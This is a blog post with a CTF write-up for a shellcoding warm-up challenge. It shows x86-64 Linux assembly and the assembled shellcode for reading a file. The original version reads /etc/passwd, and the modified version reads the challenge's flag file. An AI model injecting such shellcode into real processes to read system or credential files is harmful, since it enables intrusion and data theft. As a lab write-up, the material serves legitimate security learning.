<!doctype html><html lang=en-us><head><title>FakeCTF - Shellcode 0x1 |
Cyxo's Tech Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=description content="A shellcoding programming (?) challenge
    "><meta property="og:title" content="FakeCTF - Shellcode 0x1"><meta property="og:description" content="A shellcoding programming (?) challenge"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.cyxo.cf/fakectf-write-ups/shellcoding-warmup/"><meta property="article:section" content="FakeCTF-Write-Ups"><meta property="article:published_time" content="2022-06-18T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-18T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="FakeCTF - Shellcode 0x1"><meta name=twitter:description content="A shellcoding programming (?) challenge"><meta itemprop=name content="FakeCTF - Shellcode 0x1"><meta itemprop=description content="A shellcoding programming (?) challenge"><meta itemprop=datePublished content="2022-06-18T00:00:00+00:00"><meta itemprop=dateModified content="2022-06-18T00:00:00+00:00"><meta itemprop=wordCount content="353"><meta itemprop=keywords content="programming,"><link rel=canonical href=https://blog.cyxo.cf/fakectf-write-ups/shellcoding-warmup/><link rel=icon type=image/png href=https://blog.cyxo.cf/image/favicon.ico><link rel=stylesheet href=/css/font-awesome.min.css><link rel=stylesheet href=/css/bulma.min.css><script src=/js/ramium.js></script>
<link rel=stylesheet href=/css/ramium.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script></head><body><nav class="navbar is-dark" role=navigation aria-label="main navigation"><div class=navbar-brand><a class=navbar-item href=/><strong>Cyxo's Tech Blog</strong></a>
<a role=button class="navbar-burger burger" aria-label=menu aria-expanded=false data-target=navbarBasicExample><span aria-hidden=true></span>
<span aria-hidden=true></span>
<span aria-hidden=true></span></a></div><div id=navbarBasicExample class=navbar-menu><div class=navbar-start><a class=navbar-item href=/>Home</a><div class="navbar-item has-dropdown is-hoverable"><a class=navbar-link>This Blog</a><div class=navbar-dropdown><a class=navbar-item href=/tags/>All Tags</a>
<a class=navbar-item href=/sections/>All Sections</a>
<a class=navbar-item href=/posts/>All Posts</a></div></div><a class=navbar-item href=/author/>Author</a></div><div class=navbar-end><a class=navbar-item title="RSS Feed" href=/index.xml target=_blank><i class="fa fa-rss-square fa-2x"></i></a>
<a class="navbar-item navgithub" title=Github href=https://github.com/Cyxo/ target=_blank><i class="fa fa-github fa-2x"></i></a></div></div></nav><div class="columns is-centered"><div id=page-body class="column is-7"><div class="content blog"><h1>FakeCTF - Shellcode 0x1</h1><div id=infobar class="level is-mobile"><div class=level-left><div class=level-item><p class="subtitle info date">Jun 18, 2022</p></div><div class=level-item><p class="subtitle info">2 mins read</p></div></div><div class="level-right is-hidden-touch"><div class=tags><a class="tag is-dark is-rounded" href=/tags/programming>Programming</a></div></div></div><div class="tags is-hidden-desktop"><a class="tag is-dark is-rounded" href=/tags/programming>Programming</a></div><div class=blog-text><p><a href=../>Go back to write-ups list</a></p><blockquote><p><strong>Category:</strong> Prog</p><p><strong>Creator:</strong> HømardBøy</p></blockquote><h2 id=the-challenge>The challenge</h2><p>When we connect to the challenge, we are prompted to send a linux x86-64 shellcode, with a maximum length of 96 bytes.</p><p>The description of the challenge also says we have to display the content of a file called &ldquo;flag&rdquo; located in the same folder as the binary.</p><p>So basically, what we should do in our shellcode is:</p><ul><li>push the file name in memory</li><li>call the OPEN system call to get a handle to the file</li><li>call the READ system call to read the content</li><li>call the WRITE system call to display the result</li></ul><p>But since I am a bit lazy, I know there are many shellcodes that can be found online and that would read a file (usually <code>/etc/passwd</code>)</p><p>So I found <a href=https://zerosum0x0.blogspot.com/2014/12/x64-linux-polymorphic-read-file.html>this article</a> and chose its second shellcode (why not the first one? I don&rsquo;t know).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-as data-lang=as><span style=display:flex><span><span style=color:#a6e22e>_start</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>filename</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>xor</span> <span style=color:#a6e22e>esi</span><span style=color:#f92672>,</span> <span style=color:#a6e22e>esi</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mul</span> <span style=color:#a6e22e>esi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rdx</span>    <span style=color:#f92672>;</span> <span style=color:#e6db74>&#39;\0&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>rcx</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0x6477737361702f63</span>  <span style=color:#f92672>;</span> <span style=color:#e6db74>&#39;c/passwd&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rcx</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>rcx</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0x74652f2f2f2f2f2f</span>  <span style=color:#f92672>;</span> <span style=color:#e6db74>&#39;//////et&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rcx</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>openfile</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rsp</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rdi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>al</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0x2</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>syscall</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>readfile</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rdi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rsp</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rsi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rdx</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rdx</span>        <span style=color:#f92672>;</span> <span style=color:#a6e22e>saving</span> <span style=color:#a6e22e>lots</span> <span style=color:#a6e22e>of</span> <span style=color:#ae81ff>0</span><span style=color:#a6e22e>s</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rdx</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rdx</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>dx</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0x999</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>syscall</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>write</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rdi</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>inc</span> <span style=color:#a6e22e>edi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>push</span> <span style=color:#a6e22e>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rdx</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>inc</span> <span style=color:#a6e22e>eax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>syscall</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>leave</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pop</span> <span style=color:#a6e22e>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>al</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>60</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>syscall</span>
</span></span></code></pre></div><p>Once assembled, it gives the following shellcode:</p><pre tabindex=0><code>1\xf6\xf7\xe6RH\xb9c/passwdQH\xb9//////etQT_\xb0\x02\x0f\x05P_T^RRRRXf\xba\x99\t\x0f\x05_\xff\xc7PZX\xff\xc0\x0f\x05X\xb0&lt;\x0f\x05
</code></pre><p>We can see the file path split in the shellcode and I just wanted to replace it with the path to the file <code>flag</code>.</p><p>I found it interesting that the path used many <code>/</code> to make the string length a multiple of 8 bytes. But here, I needed to read a file in the local directory. So the path I chose was <code>.///////////flag</code>, and it worked!</p><p>Final shellcode:</p><pre tabindex=0><code>1\xf6\xf7\xe6RH\xb9////flagQH\xb9./////etQT_\xb0\x02\x0f\x05P_T^RRRRXf\xba\x99\t\x0f\x05_\xff\xc7PZX\xff\xc0\x0f\x05X\xb0&lt;\x0f\x05
</code></pre><blockquote><p>Note: I know I could probably only push one shorter string, like <code>.///flag</code> but in the middle of a CTF, it was just easier to copy the compiled shellcode and edit the path from there, instead of reassembling one.</p></blockquote><p><a href=../>Go back to write-ups list</a></p></div></div><div id=social-media-share class=has-text-centered><p><i>Sharing is caring!</i></p><br><div class=share-buttons><a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f" onclick='return socialMediaPopUp(this.href,"",500,500),!1' title="Share on Facebook. Opens in a new window."><img src=/img/icons/45px/facebook.png></a>
<a href="https://twitter.com/intent/tweet?text=FakeCTF%20-%20Shellcode%200x1&url=https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f" onclick='return socialMediaPopUp(this.href,"",500,500),!1' title="Share on Twitter. Opens in a new window."><img src=/img/icons/45px/twitter.png></a>
<a href="http://www.reddit.com/submit?url=https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f" onclick='return socialMediaPopUp(this.href,"",900,500),!1' title="Share on Reddit. Opens in a new window."><img src=/img/icons/45px/reddit.png></a>
<a href="http://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f" onclick='return socialMediaPopUp(this.href,"",900,500),!1' title="Share on Pinterest. Opens in a new window."><img src=/img/icons/45px/pinterest.png></a>
<a href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f" onclick='return socialMediaPopUp(this.href,"",900,500),!1' title="Share on Tumblr. Opens in a new window."><img src=/img/icons/45px/tumblr.png></a>
<a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f
			&title=FakeCTF%20-%20Shellcode%200x1&summary=Go%20back%20to%20write-ups%20list%0aCategory%3a%20Prog%0aCreator%3a%20H%c3%b8mardB%c3%b8y%0aThe%20challenge%20When%20we%20connect%20to%20the%20challenge%2c%20we%20are%20prompted%20to%20send%20a%20linux%20x86-64%20shellcode%2c%20with%20a%20maximum%20length%20of%2096%20bytes.%0aThe%20description%20of%20the%20challenge%20also%20says%20we%20have%20to%20display%20the%20content%20of%20a%20file%20called%20%26ldquo%3bflag%26rdquo%3b%20located%20in%20the%20same%20folder%20as%20the%20binary.&source=rafed123.github.io" onclick='return socialMediaPopUp(this.href,"",900,500),!1' title="Share on LinkedIn. Opens in a new window."><img src=/img/icons/45px/linkedin.png></a>
<a href="mailto:?subject=FakeCTF%20-%20Shellcode%200x1&body=Check out this site https%3a%2f%2fblog.cyxo.cf%2ffakectf-write-ups%2fshellcoding-warmup%2f" title="Share via Email. Opens in a new window."><img src=/img/icons/45px/mail.png></a></div></div><br><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname=="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></div><footer class="footer has-background-dark"><div class="content has-text-centered has-text-white"><p>© 2020 Ramium. Powered by
<a class=has-text-light href=https://github.com/gohugoio/hugo target=_blank>Hugo</a>. Theme
<a class=has-text-light href=https://github.com/rafed123/ramium/ target=_blank>Ramium.</a></p></div></footer></body></html>